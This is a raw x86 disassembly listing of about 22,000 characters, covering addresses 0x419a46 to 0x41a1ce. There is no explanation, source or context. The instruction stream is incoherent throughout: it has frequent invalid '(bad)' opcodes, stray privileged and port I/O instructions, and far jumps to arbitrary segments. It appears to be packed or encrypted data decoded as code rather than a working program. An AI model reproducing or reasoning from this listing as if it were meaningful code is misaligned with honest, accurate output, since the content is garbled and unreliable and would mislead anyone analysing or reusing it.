  419a46:	mov    edx,0x3aab4d2f
  419a4b:	outs   dx,DWORD PTR ds:[esi]
  419a4c:	and    DWORD PTR [edi-0x40bdec85],esi
  419a52:	not    ebx
  419a54:	sbb    eax,0x210c0ee0
  419a59:	ss pop esp
  419a5b:	test   al,0x3
  419a5d:	cwde   
  419a5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a5f:	or     ah,bh
  419a61:	sub    al,0xe2
  419a63:	and    bh,ch
  419a65:	rcl    BYTE PTR [ebx-0x39],cl
  419a68:	ror    DWORD PTR [ebp-0x281ca4e7],0xdf
  419a6f:	and    eax,0x2033f11d
  419a74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a75:	mov    dl,0xce
  419a77:	jne    0x419ad4
  419a79:	push   edx
  419a7a:	mov    WORD PTR ds:[eax],fs
  419a7d:	mov    edx,0x307c6eee
  419a82:	xlat   BYTE PTR ds:[ebx]
  419a83:	mov    edi,0x44e2f510
  419a88:	mov    ds:0x669cc99e,eax
  419a8d:	(bad)  
  419a8e:	cli    
  419a8f:	ds xchg ecx,eax
  419a91:	call   0x30fd:0x6f45fc21
  419a98:	push   ebx
  419a99:	adc    eax,0x5724ef99
  419a9e:	out    0x90,eax
  419aa0:	add    cl,bl
  419aa2:	(bad)
  419aa6:	fadd   DWORD PTR [eax]
  419aa8:	loope  0x419a93
  419aaa:	sbb    ch,cl
  419aac:	fnstcw WORD PTR cs:[esi-0x3f]
  419ab0:	sbb    al,0xc
  419ab2:	or     DWORD PTR [edi+esi*8],eax
  419ab5:	sbb    esp,DWORD PTR [ecx-0x3]
  419ab8:	fmul   DWORD PTR [edx+0x35]
  419abb:	dec    ebp
  419abc:	mov    al,0x9d
  419abe:	sbb    esi,DWORD PTR [ebx+0x73]
  419ac1:	cmp    esp,DWORD PTR [edx]
  419ac3:	pop    edx
  419ac4:	mov    ds:0x3eb1876d,eax
  419ac9:	mov    ss,WORD PTR [edx-0x5ee983d1]
  419acf:	or     ah,al
  419ad1:	mov    es:0x58c7837e,al
  419ad7:	scas   eax,DWORD PTR es:[edi]
  419ad8:	scas   al,BYTE PTR es:[edi]
  419ad9:	dec    edx
  419ada:	cmp    dh,0x22
  419add:	lock adc ah,BYTE PTR [ebx]
  419ae0:	inc    edx
  419ae1:	sbb    BYTE PTR [ebx-0x4f],cl
  419ae4:	add    ch,0x60
  419ae7:	xor    al,0xf2
  419ae9:	jo     0x419b3f
  419aeb:	in     eax,dx
  419aec:	dec    esi
  419aed:	sbb    DWORD PTR [ecx],esp
  419aef:	inc    eax
  419af0:	pop    esi
  419af1:	mov    cl,0xa1
  419af3:	mov    cl,0xb4
  419af5:	or     DWORD PTR [ebp+ebx*8+0x2c],edx
  419af9:	and    al,cl
  419afb:	jmp    0x1cdd:0x65f8ee6b
  419b02:	lds    esi,FWORD PTR [eax-0x3c74a12c]
  419b08:	nop
  419b09:	popf   
  419b0a:	(bad)
  419b0e:	bnd jg 0x419ad9
  419b11:	fidiv  DWORD PTR [ecx+0x2b]
  419b14:	cmp    DWORD PTR [ebp-0x5bb217a4],esi
  419b1a:	inc    edi
  419b1b:	jmp    0x71a5f40f
  419b20:	shl    BYTE PTR [edx],1
  419b22:	ds pop ecx
  419b24:	das    
  419b25:	outs   dx,DWORD PTR ds:[esi]
  419b26:	mov    eax,0xc629f467
  419b2b:	imul   ecx,DWORD PTR [esi-0x576861df],0x79
  419b32:	fdivr  DWORD PTR [edx]
  419b34:	(bad)  
  419b35:	jmp    0x6cfbf02b
  419b3a:	popf   
  419b3b:	fstp   TBYTE PTR [edx+0x18]
  419b3e:	xor    al,0xf0
  419b40:	retf   
  419b41:	fistp  DWORD PTR [edx+0x25]
  419b44:	outs   dx,DWORD PTR ds:[esi]
  419b45:	xchg   edx,eax
  419b46:	pop    ss
  419b47:	inc    ecx
  419b48:	lock mov dh,0xb4
  419b4b:	and    DWORD PTR [ebx+ebp*8-0x5f],esi
  419b4f:	pop    ds
  419b50:	call   FWORD PTR ds:[ebx-0xd483b83]
  419b57:	sbb    al,0x73
  419b59:	inc    ebp
  419b5a:	ret    
  419b5b:	dec    eax
  419b5c:	popf   
  419b5d:	xor    ecx,DWORD PTR [edx]
  419b5f:	cs add eax,0xeb1cc7ee
  419b65:	or     eax,0x303c7e60
  419b6a:	test   DWORD PTR [ecx],0x29b37112
  419b70:	jnp    0x419b3d
  419b72:	repnz neg DWORD PTR [esi-0x6d]
  419b76:	mov    esp,ebp
  419b78:	push   eax
  419b79:	xor    edi,DWORD PTR ds:0x99bf676d
  419b7f:	pop    eax
  419b80:	hlt    
  419b81:	sbb    ebp,DWORD PTR ds:0xf31473d8
  419b87:	outs   dx,BYTE PTR ds:[esi]
  419b88:	in     eax,dx
  419b89:	mov    dh,0x45
  419b8b:	lods   eax,DWORD PTR ds:[esi]
  419b8c:	mov    ah,ch
  419b8e:	inc    eax
  419b8f:	dec    ebx
  419b90:	jmp    0x9ac9:0xd49dcb1b
  419b97:	loop   0x419bad
  419b99:	stos   DWORD PTR es:[edi],eax
  419b9a:	and    BYTE PTR [esi+0x48c34c79],al
  419ba0:	xor    dl,BYTE PTR [eax]
  419ba2:	(bad)  [esi-0x4c76304f]
  419ba8:	mov    WORD PTR [eax+ebp*2],gs
  419bab:	cli    
  419bac:	test   eax,0xdcc5dab1
  419bb1:	cmp    DWORD PTR [eax-0x362eb01a],eax
  419bb7:	fsubr  QWORD PTR ds:0x8198fa86
  419bbd:	mov    WORD PTR [esi-0x92919aa],fs
  419bc3:	pushaw 
  419bc5:	dec    ebx
  419bc6:	ds and al,0xd4
  419bc9:	popf   
  419bca:	stos   BYTE PTR es:[edi],al
  419bcb:	and    cl,bl
  419bcd:	adc    DWORD PTR [ecx],ebp
  419bcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bd0:	outs   dx,BYTE PTR ds:[esi]
  419bd1:	inc    ebx
  419bd2:	xor    al,0xcc
  419bd4:	inc    ebp
  419bd5:	inc    esp
  419bd6:	xor    BYTE PTR [ebp+0x32],dl
  419bd9:	fwait
  419bda:	jg     0x419c38
  419bdc:	(bad)  
  419bdd:	bound  ecx,QWORD PTR ds:[esi+0x7a98a0a3]
  419be4:	cmp    BYTE PTR [edx-0x32],0x77
  419be8:	int3   
  419be9:	call   0x71c8d6f9
  419bee:	sub    al,0xcb
  419bf0:	neg    BYTE PTR [ebx-0x10]
  419bf3:	int    0x45
  419bf5:	out    dx,al
  419bf6:	test   BYTE PTR [ebx-0x18afae45],0x27
  419bfd:	jne    0x419b8d
  419bff:	jmp    0xb6c4:0xf1d99609
  419c06:	xchg   DWORD PTR [ebx],esp
  419c08:	rcl    ah,1
  419c0a:	rep stos BYTE PTR es:[edi],al
  419c0c:	rcl    BYTE PTR [eax+eiz*1+0x22e54d7e],0xc3
  419c14:	and    eax,DWORD PTR [eax+esi*2-0x30435360]
  419c1b:	ja     0x419c56
  419c1d:	or     BYTE PTR [ecx],al
  419c1f:	mov    dh,0x30
  419c21:	jmp    0x6e05:0x19e0bb5f
  419c28:	stc    
  419c29:	xor    dh,dl
  419c2b:	push   edx
  419c2c:	addr16 dec ecx
  419c2e:	mov    ebp,DWORD PTR [edi+0x1981d060]
  419c34:	sub    al,0xc3
  419c36:	loope  0x419c03
  419c38:	arpl   WORD PTR [eax-0x16c04c9c],dx
  419c3e:	sub    bh,ah
  419c40:	xor    al,0x6a
  419c42:	fbld   TBYTE PTR [ebp-0x40]
  419c45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c46:	sub    DWORD PTR [esi+ebx*1-0x1],esi
  419c4a:	lds    edx,FWORD PTR [ecx]
  419c4c:	outs   dx,BYTE PTR ds:[esi]
  419c4d:	test   eax,0x78d3762d
  419c52:	lea    ecx,ds:0x8186cdd2
  419c58:	jmp    0xc0393f4c
  419c5d:	js     0x419c2f
  419c5f:	scas   al,BYTE PTR es:[edi]
  419c60:	push   es
  419c61:	ins    BYTE PTR es:[edi],dx
  419c62:	outs   dx,DWORD PTR ds:[esi]
  419c63:	xchg   esp,eax
  419c64:	into   
  419c65:	neg    edx
  419c67:	push   esi
  419c68:	clc    
  419c69:	pop    ds
  419c6a:	cmc    
  419c6b:	(bad)  
  419c6c:	clc    
  419c6d:	push   esp
  419c6e:	out    dx,al
  419c6f:	sub    eax,eax
  419c71:	ret    0xeac
  419c74:	imul   esi,DWORD PTR [esi+0x75],0x51
  419c78:	push   cs
  419c79:	(bad)  
  419c7b:	xor    eax,0x87c64b65
  419c80:	jecxz  0x419c60
  419c82:	sbb    eax,0x8577dc1e
  419c87:	xchg   edx,eax
  419c88:	or     al,0x23
  419c8a:	jmp    0x4d5aeeb7
  419c8f:	nop
  419c90:	fldcw  WORD PTR [ebx+0x70]
  419c93:	(bad)  
  419c94:	setne  BYTE PTR [ebp-0xe0507fa]
  419c9b:	push   esi
  419c9c:	mov    ah,BYTE PTR [ecx]
  419c9e:	scas   al,BYTE PTR es:[edi]
  419c9f:	gs jb  0x419d15
  419ca2:	sbb    al,0xb9
  419ca4:	or     BYTE PTR [ebx],bl
  419ca6:	stos   DWORD PTR es:[edi],eax
  419ca7:	fmul   DWORD PTR [ebp-0x4173766c]
  419cad:	xor    al,0xd1
  419caf:	sub    DWORD PTR [esi+0x39],esp
  419cb2:	test   eax,0xe578b104
  419cb7:	push   ds
  419cb8:	mov    edi,0xff1ac1c3
  419cbd:	ins    DWORD PTR es:[edi],dx
  419cbe:	aaa    
  419cbf:	retf   
  419cc0:	xor    al,0xe0
  419cc2:	mov    al,ds:0x22bba42d
  419cc7:	std    
  419cc8:	dec    ecx
  419cc9:	xor    BYTE PTR [ebx],bl
  419ccb:	test   al,0x81
  419ccd:	sbb    al,BYTE PTR [esi+ebp*8+0xb]
  419cd1:	lss    esp,FWORD PTR [eax-0x2]
  419cd5:	cli    
  419cd6:	in     eax,0xa5
  419cd8:	int3   
  419cd9:	les    esp,FWORD PTR [ecx+0x2e]
  419cdc:	leave  
  419cdd:	cwde   
  419cde:	push   0xffffff97
  419ce0:	nop
  419ce1:	pop    edx
  419ce2:	es xchg ebp,eax
  419ce4:	inc    esp
  419ce5:	retf   
  419ce6:	mov    dh,0xfe
  419ce8:	in     eax,dx
  419ce9:	push   ecx
  419cea:	sar    BYTE PTR [esi+0x3],1
  419ced:	aam    0x56
  419cef:	popa   
  419cf0:	xor    BYTE PTR [edi+ecx*2-0x7eb1bcbb],bl
  419cf7:	cmp    al,0x8e
  419cf9:	jae    0x419d60
  419cfb:	lock out dx,al
  419cfd:	in     eax,0x92
  419cff:	lds    edi,FWORD PTR [ecx-0x5b66b288]
  419d05:	pop    ss
  419d06:	xchg   edx,eax
  419d07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d08:	rol    BYTE PTR [edi],0x29
  419d0b:	pop    eax
  419d0c:	xchg   esp,eax
  419d0d:	(bad)  
  419d0e:	aaa    
  419d0f:	sub    al,0xe2
  419d11:	xchg   ecx,ecx
  419d13:	dec    edx
  419d14:	enter  0x123,0x70
  419d18:	repz fsubr st,st(3)
  419d1b:	les    ebx,FWORD PTR [esp+esi*2-0x5b]
  419d1f:	jne    0x419d0d
  419d21:	aaa    
  419d22:	cwde   
  419d23:	push   0xd4ba759
  419d28:	js     0x419d94
  419d2a:	(bad)  [eax+0x593bc1fe]
  419d30:	test   DWORD PTR [esi+eiz*1],0xc38cbeab
  419d37:	xor    BYTE PTR [edx],al
  419d39:	xor    BYTE PTR [esi-0x4a],dl
  419d3c:	sar    BYTE PTR [ebp+0x1a],0x66
  419d40:	mov    ebp,esi
  419d42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d43:	push   ebp
  419d44:	inc    edx
  419d45:	jns    0x419cf7
  419d47:	jle    0x419d7e
  419d49:	ret    0xb35f
  419d4c:	adc    eax,0xeaecf2cf
  419d51:	aaa    
  419d52:	and    eax,0x30675c36
  419d57:	pop    ebx
  419d58:	sti    
  419d59:	adc    edx,DWORD PTR [ebx+ebp*1-0x18]
  419d5d:	fsqrt  
  419d5f:	cmp    al,0x9c
  419d61:	sbb    ah,BYTE PTR [eax]
  419d63:	inc    ecx
  419d64:	mov    ebx,0x8ba503cb
  419d69:	(bad)  
  419d6a:	xor    bl,ch
  419d6c:	bound  eax,QWORD PTR [ecx]
  419d6e:	jp     0x419d70
  419d70:	pop    ds
  419d71:	retf   0x7559
  419d74:	adc    esi,esp
  419d76:	jae    0x419d96
  419d78:	cmc    
  419d79:	dec    esi
  419d7a:	or     al,BYTE PTR [ecx]
  419d7c:	cmp    al,0xbc
  419d7e:	retf   
  419d7f:	push   ebx
  419d80:	dec    ebp
  419d81:	sub    al,ch
  419d83:	mov    esp,0xd52e51f0
  419d88:	retf   0x62fe
  419d8b:	jbe    0x419d8b
  419d8d:	cmp    eax,0x5e8a2b20
  419d92:	iret   
  419d93:	fdiv   st(7),st
  419d95:	hlt    
  419d96:	sbb    esp,DWORD PTR [edi+0x21]
  419d99:	aam    0x2d
  419d9b:	mov    eax,ds:0xa7e3a29d
  419da0:	push   es
  419da1:	in     al,0xb2
  419da3:	pop    ds
  419da4:	pop    ebx
  419da5:	xor    DWORD PTR [esi-0x4b],ecx
  419da8:	addr16 je 0x419d5a
  419dab:	inc    esi
  419dac:	rol    DWORD PTR [edx+eiz*8],1
  419daf:	(bad)  
  419db0:	dec    edi
  419db1:	aas    
  419db2:	xor    ebp,DWORD PTR [ebp+0x49]
  419db5:	out    0xeb,al
  419db7:	mov    esi,0x38b6b019
  419dbc:	fisub  WORD PTR [edx+0x296fc8d9]
  419dc2:	push   cs
  419dc3:	and    edx,DWORD PTR [edi+eax*1]
  419dc6:	mov    WORD PTR ds:[edi],?
  419dc9:	sub    BYTE PTR [edx+ebx*2-0x7],ah
  419dcd:	mov    esi,0x534a0103
  419dd2:	(bad)  
  419dd3:	ret    0x6e74
  419dd6:	rcr    BYTE PTR [eax],1
  419dd8:	dec    edx
  419dd9:	ins    BYTE PTR es:[edi],dx
  419dda:	pushf  
  419ddb:	pop    es
  419ddc:	pop    edx
  419ddd:	or     DWORD PTR [edx-0x7d],esp
  419de0:	sub    DWORD PTR [edx+0x3b],eax
  419de3:	dec    edx
  419de4:	stc    
  419de5:	out    0xcf,eax
  419de7:	jl     0x419e5a
  419de9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419dea:	sar    BYTE PTR ds:0xafd72793,cl
  419df0:	test   eax,0xd1adbf16
  419df6:	push   es
  419df7:	sub    ebp,DWORD PTR [ebx-0x60d1f5c2]
  419dfd:	test   DWORD PTR [ebx],esi
  419dff:	pop    ecx
  419e00:	mov    esi,0xfb50ee8a
  419e05:	push   edx
  419e06:	pop    edi
  419e07:	dec    ebp
  419e08:	bound  ecx,QWORD PTR [edx+0x54]
  419e0b:	push   edx
  419e0c:	outs   dx,DWORD PTR ds:[esi]
  419e0d:	in     al,0x59
  419e0f:	mov    ah,0x2f
  419e11:	stos   BYTE PTR es:[edi],al
  419e12:	inc    ebx
  419e13:	adc    ah,BYTE PTR [ecx-0x52254cb3]
  419e19:	lods   eax,DWORD PTR ds:[esi]
  419e1a:	fcmovb st,st(4)
  419e1c:	mov    dl,0xfc
  419e1e:	lahf   
  419e1f:	out    0x4a,eax
  419e21:	sbb    BYTE PTR [edx],ch
  419e23:	test   DWORD PTR [esi+0x19],edx
  419e26:	pop    eax
  419e27:	mov    WORD PTR [ebp+0x7f],es
  419e2a:	jb     0x419df9
  419e2c:	mov    ds:0x65f1e9a9,al
  419e31:	jge    0x419e99
  419e33:	dec    DWORD PTR [ebp-0x66]
  419e36:	in     eax,0xe7
  419e38:	inc    ecx
  419e39:	sbb    bl,BYTE PTR [ebx-0x521f97b3]
  419e3f:	fdivr  DWORD PTR [ebp+eax*2-0xa9fef2b]
  419e46:	cmp    al,0x88
  419e48:	xchg   edi,eax
  419e49:	cmp    BYTE PTR [eax+0xd0ba72],dl
  419e4f:	push   es
  419e50:	mov    bh,0xbd
  419e52:	and    bl,BYTE PTR [ebp-0x6c]
  419e55:	retf   
  419e56:	and    ch,dl
  419e58:	and    BYTE PTR [esi],dl
  419e5a:	push   edx
  419e5b:	inc    ebp
  419e5c:	jbe    0x419ea1
  419e5e:	fsubr  DWORD PTR [ecx+ecx*4+0x4a]
  419e62:	sub    BYTE PTR ds:0x23093576,al
  419e68:	cmp    BYTE PTR [edi],bh
  419e6a:	call   DWORD PTR [edi]
  419e6c:	outs   dx,DWORD PTR ds:[esi]
  419e6d:	fld    DWORD PTR [edi-0x67]
  419e70:	mov    cl,0xdb
  419e72:	inc    eax
  419e73:	jg     0x419e8b
  419e75:	mov    BYTE PTR [ebx-0x11],ch
  419e78:	pop    ebp
  419e79:	xor    al,0x14
  419e7b:	mov    al,ds:0x8b4535f2
  419e80:	jae    0x419eba
  419e82:	jl     0x419ebf
  419e84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e85:	ss pop ebp
  419e87:	push   cs
  419e88:	dec    eax
  419e89:	pop    ss
  419e8a:	and    BYTE PTR [ecx-0x18],cl
  419e8d:	(bad)  [eax+esi*1-0x2]
  419e91:	popa   
  419e92:	fwait
  419e93:	jno    0x419e41
  419e95:	adc    esp,edi
  419e97:	ja     0x419e6e
  419e99:	adc    esp,DWORD PTR [eax-0x302cdda9]
  419e9f:	sub    ebx,DWORD PTR [ecx+0x3a]
  419ea2:	lock pop ecx
  419ea4:	and    DWORD PTR [ebp+0x5e],ebx
  419ea7:	push   ds
  419ea8:	out    dx,al
  419ea9:	inc    ebx
  419eaa:	gs jo  0x419f07
  419ead:	ret    
  419eae:	pop    edx
  419eaf:	cld    
  419eb0:	push   ecx
  419eb1:	push   eax
  419eb2:	dec    ecx
  419eb3:	xor    al,0x8b
  419eb5:	or     edx,DWORD PTR [ebx+0x7b770144]
  419ebb:	sbb    ebp,DWORD PTR [ecx]
  419ebd:	ins    BYTE PTR es:[edi],dx
  419ebe:	mov    ecx,0xf4ad145b
  419ec3:	sub    esi,DWORD PTR [ebp+0x3f]
  419ec6:	lods   eax,DWORD PTR ds:[esi]
  419ec7:	pop    es
  419ec8:	sbb    al,0x99
  419eca:	mov    esp,0x4f8c3650
  419ecf:	push   ebx
  419ed0:	push   es
  419ed1:	pop    ebx
  419ed2:	sub    DWORD PTR es:[edi+0x2bed7220],edx
  419ed9:	push   esp
  419eda:	lea    ebp,ds:[esi+0x2b]
  419ede:	and    dh,BYTE PTR [eax-0x29]
  419ee1:	fadd   st,st(5)
  419ee3:	stc    
  419ee4:	xchg   BYTE PTR [ebx-0x748a3096],dh
  419eea:	add    BYTE PTR [ebx+eax*1],ch
  419eed:	icebp  
  419eee:	pop    ebx
  419eef:	icebp  
  419ef0:	pop    ebp
  419ef1:	daa    
  419ef2:	cmp    al,0x59
  419ef4:	add    al,bl
  419ef6:	lea    eax,[eax+0x22619189]
  419efc:	shl    DWORD PTR [ebx+0x508fbf31],1
  419f02:	jge    0x419f06
  419f04:	jmp    0x419f77
  419f06:	or     ch,BYTE PTR [ecx-0x40]
  419f09:	add    ebx,ebp
  419f0b:	xor    DWORD PTR [edx+0x3411c9ec],esp
  419f11:	imul   DWORD PTR [edx-0x5a61ce4b]
  419f17:	pop    ds
  419f18:	sub    al,0x35
  419f1a:	stos   BYTE PTR es:[edi],al
  419f1b:	sub    eax,0xac32fb8f
  419f20:	xchg   ebx,eax
  419f21:	and    eax,0x9edfa8d8
  419f26:	mov    ecx,0x32fcf1db
  419f2b:	test   al,0x1f
  419f2d:	lock dec ebx
  419f2f:	in     eax,dx
  419f30:	(bad)  
  419f32:	jmp    FWORD PTR [esi-0x21]
  419f35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f36:	outs   dx,BYTE PTR ds:[esi]
  419f37:	cmp    DWORD PTR [edi+0x10],eax
  419f3a:	mov    eax,0xc861de82
  419f3f:	push   ebx
  419f40:	xchg   esp,eax
  419f41:	mov    ebx,0xaa72c2ef
  419f46:	add    esi,DWORD PTR [ebp-0xe]
  419f49:	xchg   ebx,eax
  419f4a:	pushf  
  419f4b:	scas   al,BYTE PTR es:[edi]
  419f4c:	fs cdq 
  419f4e:	loopne 0x419f38
  419f50:	sar    BYTE PTR [edi],0x48
  419f53:	cmp    BYTE PTR [ecx-0x6d6ce619],bh
  419f59:	idiv   DWORD PTR [ecx-0x476f221]
  419f5f:	mov    bl,0x7
  419f61:	xchg   BYTE PTR [edi+ecx*1+0x4f],ch
  419f65:	sti    
  419f66:	gs stos BYTE PTR es:[edi],al
  419f68:	mov    ch,BYTE PTR [esp+eax*8]
  419f6b:	mov    edx,0x806201db
  419f70:	(bad)  
  419f71:	dec    cl
  419f73:	out    0xaa,al
  419f75:	mov    BYTE PTR [eax],ch
  419f77:	(bad)  
  419f78:	lea    esp,[ecx-0x4c]
  419f7b:	sbb    al,0x72
  419f7d:	mov    bh,BYTE PTR [edx]
  419f7f:	test   BYTE PTR ss:[ebx+0x49],cl
  419f83:	mov    WORD PTR [edx-0x2c],?
  419f86:	test   ah,cl
  419f88:	lea    esi,[edx]
  419f8a:	mov    bh,0x70
  419f8c:	sti    
  419f8d:	jno    0x419f74
  419f8f:	ja     0x419fa7
  419f91:	dec    esi
  419f92:	cmp    BYTE PTR [edi],0x1c
  419f95:	mov    edx,0xaaac37f6
  419f9a:	mov    dh,0x2a
  419f9c:	(bad)  
  419f9d:	test   eax,0x8f848033
  419fa2:	shr    DWORD PTR [ebx],cl
  419fa4:	gs inc edx
  419fa6:	jmp    0x419fa9
  419fa8:	in     eax,0x28
  419faa:	inc    DWORD PTR [edx+0x7a]
  419fad:	or     DWORD PTR [esi],edx
  419faf:	push   ds
  419fb0:	cmp    eax,0xf21d0060
  419fb5:	ss jp  0x419f63
  419fb8:	int    0x1b
  419fba:	out    0x3a,al
  419fbc:	sti    
  419fbd:	sbb    bl,dl
  419fbf:	cmp    edx,0xfb7ff48f
  419fc5:	ins    DWORD PTR es:[edi],dx
  419fc6:	das    
  419fc7:	lea    ecx,[ecx-0x59]
  419fca:	mov    bl,BYTE PTR [esi-0x58495e6d]
  419fd0:	jae    0x419fa4
  419fd2:	pushw  ds
  419fd4:	fs aam 0x5f
  419fd7:	mov    ch,0xf3
  419fd9:	sbb    eax,0xb991f9e9
  419fde:	out    0x3a,al
  419fe0:	inc    DWORD PTR [edx]
  419fe2:	mov    ds:0x45362fc6,al
  419fe7:	scas   al,BYTE PTR es:[edi]
  419fe8:	leave  
  419fe9:	sub    BYTE PTR ss:[ecx],al
  419fec:	shr    ebp,1
  419fee:	(bad)  
  419fef:	out    0x50,al
  419ff1:	or     BYTE PTR [edi+0xf0ba96e],dh
  419ff7:	jne    0x41a007
  419ff9:	in     eax,dx
  419ffa:	jg     0x419f9d
  419ffc:	vmwrite esi,DWORD PTR [ecx+0x92cdea8]
  41a003:	shl    DWORD PTR [eax-0x24183964],1
  41a009:	adc    dl,BYTE PTR [ecx-0x4a]
  41a00c:	das    
  41a00d:	and    edi,esp
  41a00f:	push   ebx
  41a010:	pusha  
  41a011:	dec    esp
  41a012:	adc    ebp,edx
  41a014:	and    eax,0xbcc01ccd
  41a019:	jb     0x41a00a
  41a01b:	inc    edi
  41a01c:	pop    ebp
  41a01d:	pop    ds
  41a01e:	mov    edx,0xfa6f877e
  41a023:	jne    0x41a004
  41a025:	xor    WORD PTR [eax],0xffa4
  41a029:	xlat   BYTE PTR ds:[ebx]
  41a02a:	fwait
  41a02b:	iret   
  41a02c:	or     bl,BYTE PTR [ebx]
  41a02e:	sub    eax,0xef579784
  41a033:	mul    DWORD PTR [edx-0x4e65a300]
  41a039:	cmp    esi,DWORD PTR ds:0x9499719d
  41a03f:	es lahf 
  41a041:	adc    edi,DWORD PTR [ebx-0x71]
  41a044:	jmp    0x77791533
  41a049:	push   edi
  41a04a:	popa   
  41a04b:	sti    
  41a04c:	pop    DWORD PTR [ecx*1-0x2d877ca8]
  41a053:	xchg   esi,eax
  41a054:	call   0x575a8c1
  41a059:	aas    
  41a05a:	push   ecx
  41a05b:	pop    edi
  41a05c:	xchg   edx,eax
  41a05d:	data16 gs jp 0x41a04c
  41a061:	ficomp WORD PTR [edi]
  41a063:	iret   
  41a064:	add    bl,BYTE PTR [ecx+ebx*8-0xce9fd1e]
  41a06b:	mov    ss,WORD PTR [ebx]
  41a06d:	mov    ebx,0x6ea431b0
  41a072:	out    0x4c,al
  41a074:	push   ds
  41a075:	xor    eax,0xb5198f8d
  41a07a:	push   ebp
  41a07b:	outs   dx,DWORD PTR ds:[esi]
  41a07c:	sub    eax,0x4624fa3
  41a081:	pop    ds
  41a082:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a083:	popa   
  41a084:	fwait
  41a085:	cwde   
  41a086:	jp     0x41a107
  41a088:	push   ebp
  41a089:	jmp    0xf9491c2
  41a08e:	imul   eax,DWORD PTR [ebx-0x5284a4a0],0xffffffb1
  41a095:	xchg   ebp,eax
  41a096:	sbb    al,0x7f
  41a098:	push   ds
  41a099:	sahf   
  41a09a:	mov    ds:0xa5820407,eax
  41a09f:	dec    bp
  41a0a1:	fldenv [ebp+edx*4-0x58c381fa]
  41a0a8:	out    0x51,al
  41a0aa:	loope  0x41a08a
  41a0ac:	sbb    al,0xc5
  41a0ae:	mov    ebp,0xcaa22052
  41a0b3:	das    
  41a0b4:	inc    eax
  41a0b5:	jb     0x41a071
  41a0b7:	jge    0x41a078
  41a0b9:	bound  ebx,QWORD PTR ds:0x9d317237
  41a0bf:	clc    
  41a0c0:	mov    bl,bl
  41a0c2:	std    
  41a0c3:	mov    dh,BYTE PTR [edi+0x57]
  41a0c6:	cmp    BYTE PTR [ecx+ebx*2+0x2c],0x4f
  41a0cb:	(bad)  
  41a0cc:	jmp    0x41a0cd
  41a0ce:	push   ss
  41a0cf:	shr    BYTE PTR [ebx+esi*1+0x57f4e69a],0x58
  41a0d7:	(bad)  
  41a0d8:	pop    edx
  41a0d9:	out    0xc2,al
  41a0db:	dec    edi
  41a0dc:	fld    DWORD PTR [esi]
  41a0de:	pop    ecx
  41a0df:	(bad)
  41a0e4:	mov    ecx,0xe0baa420
  41a0e9:	inc    eax
  41a0ea:	or     DWORD PTR [esi+0x1b197519],esi
  41a0f0:	scas   al,BYTE PTR es:[edi]
  41a0f1:	jecxz  0x41a0df
  41a0f3:	lahf   
  41a0f4:	jmp    0x31ea:0x9bdef907
  41a0fb:	test   al,0xed
  41a0fd:	addr16 (bad) 
  41a0ff:	jecxz  0x41a139
  41a101:	(bad)  
  41a102:	(bad)  
  41a103:	sbb    edx,DWORD PTR [edx-0x62]
  41a106:	cmc    
  41a107:	dec    esi
  41a108:	ret    
  41a109:	push   esi
  41a10a:	mov    eax,0x73aa0e05
  41a10f:	pand   mm3,QWORD PTR [eax-0x59]
  41a113:	mov    cl,0xa1
  41a115:	fwait
  41a116:	repnz push edx
  41a118:	and    al,0xf0
  41a11a:	mov    bl,0xe1
  41a11c:	xor    eax,0x1d0864df
  41a121:	test   DWORD PTR [esi+0x3f],0xd180b27c
  41a128:	adc    al,BYTE PTR [ebp+0x77]
  41a12b:	mov    edi,0xaffc6dbe
  41a130:	enter  0x749e,0x7a
  41a134:	daa    
  41a135:	adc    DWORD PTR [esp+esi*2-0x5d],esi
  41a139:	iret   
  41a13a:	xor    dh,al
  41a13c:	push   edx
  41a13d:	sub    BYTE PTR [edi+0x2f41bd81],bl
  41a143:	and    edx,DWORD PTR [ebp-0x6f]
  41a146:	jecxz  0x41a0f4
  41a148:	or     eax,0xae100851
  41a14d:	mov    edx,DWORD PTR [edx]
  41a14f:	aam    0x57
  41a151:	mov    ds:0xb6be5253,al
  41a156:	enter  0x4e26,0xc4
  41a15a:	jnp    0x41a131
  41a15c:	sahf   
  41a15d:	xor    edi,DWORD PTR [edi-0x47]
  41a160:	push   edx
  41a161:	pop    eax
  41a162:	mov    esi,0xddaece51
  41a167:	and    BYTE PTR [esi+eiz*2+0x5f],dl
  41a16b:	hlt    
  41a16c:	int    0xea
  41a16e:	pop    esi
  41a16f:	repz or BYTE PTR [eax+0x27a5059b],ch
  41a176:	fcom   QWORD PTR [esi+0x1b40e82b]
  41a17c:	cmp    DWORD PTR [ebp+0x3db108],edx
  41a182:	or     dh,bl
  41a184:	sbb    ah,bh
  41a186:	mov    bh,BYTE PTR [esi-0x4]
  41a189:	rsm    
  41a18b:	mov    ebp,0x7234fba2
  41a190:	popf   
  41a191:	fld    st(2)
  41a193:	es or  edx,0x9dc78c31
  41a19a:	add    esp,DWORD PTR [ecx]
  41a19c:	cmp    edi,DWORD PTR [edx]
  41a19e:	xchg   ecx,eax
  41a19f:	add    bh,dl
  41a1a1:	test   DWORD PTR [edx],ebx
  41a1a3:	or     DWORD PTR [ebx-0x37],ecx
  41a1a6:	jg     0x41a1b5
  41a1a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1a9:	jle    0x41a1f5
  41a1ab:	dec    edx
  41a1ac:	pop    edx
  41a1ad:	pushf  
  41a1ae:	ds jo  0x41a19a
  41a1b1:	clc    
  41a1b2:	inc    ebx
  41a1b3:	jo     0x41a1fd
  41a1b5:	(bad)  
  41a1b6:	jo     0x41a197
  41a1b8:	ret    0x5047
  41a1bb:	lods   al,BYTE PTR ds:[esi]
  41a1bc:	or     BYTE PTR [eax-0x34],0x77
  41a1c0:	stos   DWORD PTR es:[edi],eax
  41a1c1:	jle    0x41a1bb
  41a1c3:	and    al,0xcb
  41a1c5:	cld    
  41a1c6:	es cmp eax,0xe678dc3
  41a1cc:	jns    0x41a1d7
  41a1ce:	arpl   WORD PTR [edi+esi*2-0x4a],ax
